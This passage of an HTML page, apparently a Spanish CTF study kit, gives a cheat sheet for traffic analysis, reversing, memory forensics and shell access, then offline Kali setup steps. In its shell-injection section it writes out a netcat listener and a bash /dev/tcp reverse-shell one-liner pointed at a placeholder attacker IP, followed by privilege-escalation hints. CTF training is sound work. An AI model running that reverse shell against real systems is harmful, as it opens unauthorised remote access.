+<li><strong>Interpretar:</strong> verás el diálogo crudo; busca <code>USER</code>/<code>PASS</code>, <code>POST /login</code>, o <code>flag{</code>. Los textos en rojo/azul separan quién habla.</li>
+</ul>
+<h3 id="tshark--r-cappcap--y-httprequest"><code>tshark -r cap.pcap -Y "http.request"</code><a class="anchor" href="#tshark--r-cappcap--y-httprequest">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> Wireshark en terminal; filtra y saca campos sin abrir la GUI.</li>
+<li><strong>Cuándo:</strong> pcaps grandes, o para pegar salida en el writeup.</li>
+<li><strong>Ejemplo:</strong> <code>tshark -r cap.pcap -Y http.request -T fields -e http.host -e http.request.uri</code></li>
+<li><strong>Interpretar:</strong> lista de hosts+rutas pedidas. Una URL rara o repetida (<code>/admin</code>, <code>/exfil?d=...</code>) marca el punto interesante.</li>
+</ul>
+<h3 id="tcpdump--r-cappcap--a-grep--i-flag"><code>tcpdump -r cap.pcap -A | grep -i flag</code><a class="anchor" href="#tcpdump--r-cappcap--a-grep--i-flag">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> vuelca el payload en ASCII y lo filtras.</li>
+<li><strong>Cuándo:</strong> revisión rápida sin abrir Wireshark.</li>
+<li><strong>Interpretar:</strong> si aparece la flag, ya está. Subdominios DNS larguísimos (<code>a1b2c3.tunnel.site</code>) → datos exfiltrados en base32/hex: decodifícalos.</li>
+</ul>
+<hr>
+<h1 id="g-reversing">G. Reversing<a class="anchor" href="#g-reversing">#</a></h1>
+<h3 id="checksec---filebinario"><code>checksec --file=BINARIO</code><a class="anchor" href="#checksec---filebinario">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> lista las protecciones del binario; definen cómo se ataca (sobre todo en pwn).</li>
+<li><strong>Cuándo:</strong> antes de meterte a explotar un ELF.</li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>NX enabled</code> → no ejecutas shellcode en la pila; usa ROP/ret2libc.</li>
+<li><code>No canary found</code> → puedes desbordar sin preocuparte del canario.</li>
+<li><code>No PIE</code> → direcciones fijas (más fácil saltar a una función).</li>
+</ul>
+</ul>
+<h3 id="ltrace-binario"><code>ltrace ./BINARIO</code><a class="anchor" href="#ltrace-binario">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> muestra las llamadas a librería mientras corre; revela comparaciones.</li>
+<li><strong>Cuándo:</strong> crackmes, "adivina la contraseña".</li>
+<li><strong>Ejemplo:</strong> <code>ltrace ./reto</code></li>
+<li><strong>Interpretar:</strong> si ves <code>strcmp("loquepuse", "S3cr3t")</code> → <code>S3cr3t</code> es la contraseña correcta (el segundo argumento).</li>
+</ul>
+<h3 id="strings--n-6-binario-grep--ie-flagpasskey"><code>strings -n 6 BINARIO | grep -iE 'flag|pass|key'</code><a class="anchor" href="#strings--n-6-binario-grep--ie-flagpasskey">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> muchos crackmes jr traen la flag/clave en claro.</li>
+<li><strong>Interpretar:</strong> si aparece, listo; si no, abre en Ghidra y lee <code>main</code> (pseudo-C).</li>
+</ul>
+<hr>
+<h1 id="h-forense-de-memoria-y-disco">H. Forense de memoria y disco<a class="anchor" href="#h-forense-de-memoria-y-disco">#</a></h1>
+<h3 id="vol--f-dumpmem-windowsinfo"><code>vol -f dump.mem windows.info</code><a class="anchor" href="#vol--f-dumpmem-windowsinfo">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> Volatility 3 analiza volcados de RAM; <code>info</code> da el perfil/SO, base de todo lo demás.</li>
+<li><strong>Cuándo:</strong> te dan un <code>.mem</code>/<code>.raw</code>/<code>.dmp</code>.</li>
+<li><strong>Interpretar:</strong> confirma que el dump se lee y qué Windows es. A partir de ahí corres <code>windows.pslist</code>, <code>windows.cmdline</code>, etc.</li>
+</ul>
+<h3 id="vol--f-dumpmem-windowspslist-windowscmdline"><code>vol -f dump.mem windows.pslist</code> / <code>windows.cmdline</code><a class="anchor" href="#vol--f-dumpmem-windowspslist-windowscmdline">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> lista procesos y los comandos con que arrancaron.</li>
+<li><strong>Interpretar:</strong> un proceso raro (<code>powershell.exe</code> con argumentos codificados, nombres extraños) o una <code>cmdline</code> con <code>-enc &lt;base64&gt;</code> → ahí está la actividad maliciosa / la pista.</li>
+</ul>
+<h3 id="foremost--i-discoimg--o-salida"><code>foremost -i disco.img -o salida/</code><a class="anchor" href="#foremost--i-discoimg--o-salida">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> recupera archivos por su firma (file carving), incluso borrados.</li>
+<li><strong>Cuándo:</strong> imágenes de disco, "recupera el archivo borrado".</li>
+<li><strong>Interpretar:</strong> en <code>salida/</code> aparecen carpetas por tipo (<code>jpg/</code>, <code>pdf/</code>); revisa los recuperados con <code>strings</code>/<code>exiftool</code>.</li>
+</ul>
+<hr>
+<h1 id="i-inyección-de-shell">I. Inyección de shell<a class="anchor" href="#i-inyección-de-shell">#</a></h1>
+<h3 id="nc--lvnp-4444-listener-en-tu-kali"><code>nc -lvnp 4444</code> (listener en tu Kali)<a class="anchor" href="#nc--lvnp-4444-listener-en-tu-kali">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> abre un puerto a la escucha donde caerá la shell de la víctima.</li>
+<li><strong>Cuándo:</strong> antes de lanzar una reverse shell.</li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li>Se queda esperando (sin prompt) → está escuchando, bien.</li>
+<li>Aparece <code>connect to ... from ...</code> y luego un prompt → <strong>la shell entró</strong>. Prueba <code>id</code>.</li>
+</ul>
+</ul>
+<h3 id="bash--i-devtcptuip4444-01-en-la-víctima"><code>bash -i &gt;&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1</code> (en la víctima)<a class="anchor" href="#bash--i-devtcptuip4444-01-en-la-víctima">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> abre una bash y redirige su E/S por TCP hasta tu listener.</li>
+<li><strong>Cuándo:</strong> tras lograr ejecución de comandos (command injection, upload, servicio).</li>
+<li><strong>Interpretar:</strong> si en tu <code>nc</code> aparece el prompt, funcionó. Si no pasa nada, prueba la variante con <code>python3</code> o revisa IP/puerto y que no haya firewall.</li>
+</ul>
+<h3 id="ya-con-shell-id-find--name-flag-2devnull-sudo--l">Ya con shell: <code>id</code>, <code>find / -name 'flag*' 2&gt;/dev/null</code>, <code>sudo -l</code><a class="anchor" href="#ya-con-shell-id-find--name-flag-2devnull-sudo--l">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> saber quién eres, buscar la flag y ver vías de escalar a root.</li>
+<li><strong>Interpretar:</strong></li>
+<ul>
+<li><code>uid=0(root)</code> → ya eres root, lee todo.</li>
+<li><code>find</code> lista <code>/root/flag.txt</code> pero <code>cat</code> da <code>Permission denied</code> → necesitas escalar.</li>
+<li><code>sudo -l</code> muestra un binario que puedes correr como root → búscalo en <strong>GTFOBins</strong> para leer la flag protegida.</li>
+</ul>
+</ul>
+<hr>
+<h1 id="j-buscar-la-flag-en-todo-comodín-final">J. Buscar la flag en todo (comodín final)<a class="anchor" href="#j-buscar-la-flag-en-todo-comodín-final">#</a></h1>
+<h3 id="grep--raoie-a-za-z0-9"><code>grep -raoiE '[A-Za-z0-9_]+\{[^}]+\}' .</code><a class="anchor" href="#grep--raoie-a-za-z0-9">#</a></h3>
+<ul>
+<li><strong>Por qué:</strong> barre todos los archivos de una carpeta buscando el patrón <code>palabra{...}</code>.</li>
+<li><strong>Cuándo:</strong> cuando ya extrajiste cosas (binwalk/foremost) y no sabes dónde mirar.</li>
+<li><strong>Interpretar:</strong> cada línea es <code>archivo: coincidencia</code>. Si sale <code>CyberFEI{...}</code>, el nombre del archivo te dice dónde estaba.</li>
+</ul>
+<hr>
+<h2 id="cómo-leer-cualquier-resultado-regla-mental">Cómo leer CUALQUIER resultado (regla mental)<a class="anchor" href="#cómo-leer-cualquier-resultado-regla-mental">#</a></h2>
+<p>1. ¿Cambió algo respecto a lo "normal"? (otro tamaño, otro código, otra respuesta) → ahí está la pista. 2. ¿Aparece el patrón de la flag? → confírmala con el formato exacto antes de enviar. 3. ¿Un error? Léelo: muchos errores (SQL, stack trace) <strong>te regalan</strong> información del sistema. 4. Si no entiendes la salida, <strong>documéntala igual</strong> en el writeup: a veces el valor está ahí y lo ves al releer.</p>
+</section>
+<section class="doc" id="sec-preparacion" data-sec="preparacion">
+<h1 id="preparación-para-ctf-offline-vm-kali">Preparación para CTF offline (VM Kali)<a class="anchor" href="#preparación-para-ctf-offline-vm-kali">#</a></h1>
+<p>Como el evento es <strong>sin internet</strong>, hay que descargar TODO antes. Haz esto desde la VM de Kali <strong>con red</strong>, días antes.</p>
+<h2 id="1-actualiza-e-instala-herramientas">1. Actualiza e instala herramientas<a class="anchor" href="#1-actualiza-e-instala-herramientas">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>sudo apt update &amp;&amp; sudo apt -y full-upgrade
+
+sudo apt -y install \
+  nmap gobuster ffuf whatweb sqlmap hydra \
+  binwalk foremost exiftool steghide zsteg pngcheck \
+  tshark tcpflow \
+  gdb radare2 ghidra \
+  john hashcat hashid \
+  python3-pip net-tools netcat-openbsd
+
+# pip (quedan cacheados en la VM)
+pip install --user pwntools sympy pycryptodome requests</code></pre></div>
+<blockquote><code>zsteg</code> a veces va por gem: <code>sudo gem install zsteg</code>. Burp Suite Community y Wireshark ya vienen en Kali.</blockquote>
+<h2 id="2-diccionarios">2. Diccionarios<a class="anchor" href="#2-diccionarios">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code># rockyou viene comprimido en Kali
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
+ls /usr/share/wordlists/      # dirb, dirbuster, seclists...
+sudo apt -y install seclists  # colección grande de wordlists</code></pre></div>
+<h2 id="3-repos-que-conviene-clonar-funcionan-offline">3. Repos que conviene clonar (funcionan offline)<a class="anchor" href="#3-repos-que-conviene-clonar-funcionan-offline">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>mkdir -p ~/tools &amp;&amp; cd ~/tools
+git clone https://github.com/Ganapati/RsaCtfTool
+git clone https://github.com/gchq/CyberChef      # abre CyberChef_vX.html en el navegador, offline
+git clone https://github.com/pwndbg/pwndbg &amp;&amp; cd pwndbg &amp;&amp; ./setup.sh &amp;&amp; cd ..
+git clone https://github.com/RsaCtfTool/RsaCtfTool 2&gt;/dev/null
+# ROPgadget / ropper
+pip install --user ROPgadget ropper</code></pre></div>
+<ul>
+<li><strong>StegSolve</strong> (jar): descarga el <code>.jar</code> y guárdalo en <code>~/tools</code>.</li>
+<li><strong>Ghidra</strong> ya viene; si no, descarga el zip oficial.</li>
+</ul>
+<h2 id="3b-descargas-que-piden-red-hoy-evento-offline-mañana">3b. Descargas que piden red HOY (evento offline mañana)<a class="anchor" href="#3b-descargas-que-piden-red-hoy-evento-offline-mañana">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code># ExploitDB local -&gt; habilita searchsploit sin internet
+sudo apt -y install exploitdb &amp;&amp; searchsploit -u   # -u actualiza la base
+
+# wpscan + su base de vulnerabilidades (si vas a tocar WordPress)
+sudo apt -y install wpscan &amp;&amp; wpscan --update
+
+# Docs y payloads que funcionan offline (clónalos)
+git clone --depth 1 https://github.com/danielmiessler/SecLists ~/tools/SecLists
+git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings ~/tools/PayloadsAllTheThings
+git clone --depth 1 https://github.com/carlospolop/hacktricks ~/tools/hacktricks
+# GTFOBins: clona el repo o guarda el sitio para consultar abusos de binarios SUID
+git clone --depth 1 https://github.com/GTFOBins/GTFOBins.github.io ~/tools/GTFOBins</code></pre></div>
+<blockquote>Recuerda la <strong>regla 5</strong>: <code>wpscan</code>/<code>sqlmap</code> son zona gris; <code>searchsploit</code> es solo consulta local (ok). Confirma con los organizadores antes de usar los automáticos.</blockquote>
+<h2 id="4-verifica-que-todo-corre-sin-red">4. Verifica que todo corre SIN red<a class="anchor" href="#4-verifica-que-todo-corre-sin-red">#</a></h2>
+<p>Antes del evento, desconecta la red de la VM y comprueba:</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>nmap --version &amp;&amp; sqlmap --version &amp;&amp; gdb --version
+python3 -c "import pwn, Crypto, sympy; print('pwntools+cripto OK')"
+python3 ~/Documents/CTF-Kit/scripts/decode.py "aGVsbG8="   # debe mostrar 'hello'</code></pre></div>
+<h2 id="5-copia-este-kit-a-la-vm-de-kali">5. Copia este kit a la VM de Kali<a class="anchor" href="#5-copia-este-kit-a-la-vm-de-kali">#</a></h2>
+<p>Desde la VM, por carpeta compartida o USB:</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>cp -r /ruta/al/CTF-Kit ~/CTF-Kit
+chmod +x ~/CTF-Kit/scripts/*.sh ~/CTF-Kit/scripts/*.py</code></pre></div>
+<h2 id="6-snapshot">6. Snapshot<a class="anchor" href="#6-snapshot">#</a></h2>
+<p>Cuando todo funcione offline, toma un <strong>snapshot</strong> de la VM. Si algo se rompe durante el evento, vuelves al estado bueno en segundos.</p>
+<hr>
+<h2 id="checklist-del-día">Checklist del día<a class="anchor" href="#checklist-del-día">#</a></h2>
+<ul>
+<li class="task"><input type="checkbox" disabled >VM arranca y herramientas corren sin red</li>
+<li class="task"><input type="checkbox" disabled >Conozco el <strong>formato de la flag</strong></li>
+<li class="task"><input type="checkbox" disabled >Carpeta por reto, con su <code>PLANTILLA-writeup.md</code></li>
+<li class="task"><input type="checkbox" disabled >Empiezo por los retos de menos puntos</li>
+<li class="task"><input type="checkbox" disabled >Anoto cada intento (sirve para el write-up)</li>
+<li class="task"><input type="checkbox" disabled >No ataco la plataforma ni a otros equipos (salvo Attack-Defense)</li>
+<li class="task"><input type="checkbox" disabled >Si me atoro 30–45 min, cambio de reto y regreso</li>
+</ul>
+</section>
+    </div>
+  </main>
+</div>
+
+<button class="totop" id="totop" title="Arriba">↑</button>
+
+<script>
+(function(){
+  // --- Tema ---
+  var themeBtn = document.getElementById('themeBtn');
+  try{ var saved = localStorage.getItem('ctf-theme'); if(saved){ document.documentElement.setAttribute('data-theme', saved); } }catch(e){}
+  themeBtn.addEventListener('click', function(){
+    var cur = document.documentElement.getAttribute('data-theme');
+    var isDark = cur ? cur==='dark' : window.matchMedia('(prefers-color-scheme: dark)').matches;
+    var next = isDark ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    try{ localStorage.setItem('ctf-theme', next); }catch(e){}
+  });
+
+  // --- Menú móvil ---
+  var body = document.body;
+  var mt = document.getElementById('menuToggle');
+  var bd = document.getElementById('backdrop');
+  function closeNav(){ body.classList.remove('nav-open'); }
+  mt.addEventListener('click', function(){ body.classList.toggle('nav-open'); });
+  bd.addEventListener('click', closeNav);
+
+  // --- Grupos plegables ---
+  document.querySelectorAll('.navhead').forEach(function(h){
+    h.addEventListener('click', function(){
+      var g = h.closest('.navgroup');
+      var open = g.getAttribute('aria-collapsed') !== 'true';
+      g.setAttribute('aria-collapsed', open ? 'true' : 'false');
+      h.setAttribute('aria-expanded', open ? 'false' : 'true');
+    });
+  });
+
+  // --- Links: cerrar menú en móvil al navegar ---
+  var links = Array.prototype.slice.call(document.querySelectorAll('.navlinks a'));
+  links.forEach(function(a){ a.addEventListener('click', function(){ if(window.innerWidth<=860) closeNav(); }); });
+
+  // --- Copiar bloques de código ---
+  document.querySelectorAll('.code .copy').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var code = btn.parentElement.querySelector('pre code');
+      var text = code ? code.innerText : '';
+      function ok(){ btn.textContent='copiado'; btn.classList.add('done'); setTimeout(function(){ btn.textContent='copiar'; btn.classList.remove('done'); },1200); }
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(ok, fallback);
+      } else { fallback(); }
+      function fallback(){
+        try{ var ta=document.createElement('textarea'); ta.value=text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); ok(); }catch(e){}
+      }
+    });
+  });
+
+  // --- Buscador del menú ---
+  var search = document.getElementById('search');
+  search.addEventListener('input', function(){
+    var q = search.value.trim().toLowerCase();
+    document.querySelectorAll('.navgroup').forEach(function(g){
+      var any=false;
+      g.querySelectorAll('.navlinks a').forEach(function(a){
+        var match = !q || a.textContent.toLowerCase().indexOf(q)>=0;
+        a.classList.toggle('hide', !match);
+        if(match) any=true;
+      });
+      g.style.display = any ? '' : 'none';
+    });
+  });
+
+  // --- Resaltar sección activa al hacer scroll (scrollspy) ---
+  var map = {};
+  links.forEach(function(a){ var s=a.getAttribute('data-slug'); if(s) map[s]=a; });
+  var targets = Object.keys(map).map(function(s){ return document.getElementById(s); }).filter(Boolean);
+  var current = null;
+  if('IntersectionObserver' in window){
+    var io = new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(en.isIntersecting){
+          var a = map[en.target.id];
+          if(a && a!==current){
+            if(current) current.classList.remove('active');
+            a.classList.add('active');
+            current = a;
+            // asegurar que el grupo esté abierto
+            var g=a.closest('.navgroup'); if(g && g.getAttribute('aria-collapsed')==='true'){ /* no forzamos */ }
+          }
+        }
+      });
+    }, {rootMargin:'-60px 0px -70% 0px', threshold:0});
+    targets.forEach(function(t){ io.observe(t); });
+  }
+
+  // --- Botón arriba ---
+  var totop = document.getElementById('totop');
+  window.addEventListener('scroll', function(){
+    totop.classList.toggle('show', window.scrollY>400);
+  });
+  totop.addEventListener('click', function(){ window.scrollTo({top:0,behavior:'smooth'}); });
+})();
+</script>
+</body>
+</html>
